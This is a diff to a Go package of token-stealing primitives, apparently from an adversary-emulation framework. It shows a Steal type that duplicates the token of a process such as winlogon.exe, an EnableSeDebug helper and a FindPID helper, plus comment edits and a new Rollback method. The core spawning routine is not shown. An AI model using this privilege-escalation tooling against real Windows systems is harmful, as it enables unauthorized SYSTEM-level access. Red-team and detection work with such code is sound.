@@ -1,5 +1,5 @@
 // Package tokens provides token-stealing primitives for privilege
-// escalation and lateral pivoting.
+// escalation and user pivoting.
 package tokens
 
 import (
@@ -26,20 +26,21 @@ const (
 	maximumAllowed        = 0x02000000
 )
 
-// Steal duplicates a primary token from another process and spawns SpawnExe
+// Steal duplicates a primary token from a target process and spawns SpawnExe
 // under it via CreateProcessWithTokenW.  MITRE T1134.001.
 //
-// Requires SeImpersonatePrivilege (Administrators by default) and
-// SeDebugPrivilege when reaching across to SYSTEM processes - set
-// EnableSeDebug to enable it programmatically.
+// Requires SeImpersonatePrivilege (Administrators by default).
+// Set EnableSeDebug=true to also enable SeDebugPrivilege so SYSTEM-owned
+// processes (e.g. winlogon.exe) can be opened across security boundaries.
 type Steal struct {
-	TargetExe     string // process to steal from, e.g. "winlogon.exe"
-	SpawnExe      string // command line to launch, e.g. "C:\Windows\System32\cmd.exe"
+	TargetExe     string // process name to steal from, e.g. "winlogon.exe"
+	SpawnExe      string // command line to launch under the stolen token
 	EnableSeDebug bool
 }
 
-func (s *Steal) Name() string  { return "token-impersonation" }
-func (s *Steal) MITRE() string { return "T1134.001" }
+func (s *Steal) Name() string     { return "token-impersonation" }
+func (s *Steal) ID() string       { return "T1134.001" }
+func (s *Steal) Rollback() error  { return nil }
 
 func (s *Steal) Run() error {
 	if s.TargetExe == "" || s.SpawnExe == "" {
@@ -57,8 +58,8 @@ func (s *Steal) Run() error {
 	return stealAndSpawn(pid, s.SpawnExe)
 }
 
-// EnableSeDebug elevates the current process token with SeDebugPrivilege.
-// Exported so other packages can reuse it without depending on Steal.
+// EnableSeDebug programmatically enables SeDebugPrivilege on the current
+// process token.  Exported for reuse by other packages (e.g. pkg/creds).
 func EnableSeDebug() error {
 	var token windows.Token
 	if err := windows.OpenProcessToken(
@@ -85,6 +86,7 @@ func EnableSeDebug() error {
 }
 
 // FindPID returns the PID of the first process matching exeName (case-insensitive).
+// Exported for reuse by other packages (e.g. pkg/creds).
 func FindPID(exeName string) (uint32, error) {
 	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
 	if err != nil {
